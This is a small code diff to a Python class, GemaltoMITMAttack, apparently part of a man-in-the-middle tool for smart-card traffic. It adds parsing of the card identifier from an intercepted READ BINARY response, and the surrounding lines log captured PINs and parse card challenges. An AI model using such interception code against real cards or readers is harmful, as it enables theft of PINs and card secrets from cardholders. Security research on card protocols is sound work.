@@ -21,6 +21,10 @@ class GemaltoMITMAttack(InterceptAttack):
             pin = msg[5:].rstrip('\x00')
             logger.info("PIN: %s", pin)
 
+        # Read binary of file 00 01
+        if msg == from_hex("00 B0 00 00 08"):
+            self.crypto.parse_card_identifier(resp)
+
         # Sending challenge
         elif msg == from_hex("80 84 00 00 08"):
             self.crypto.parse_card_challenge(resp)
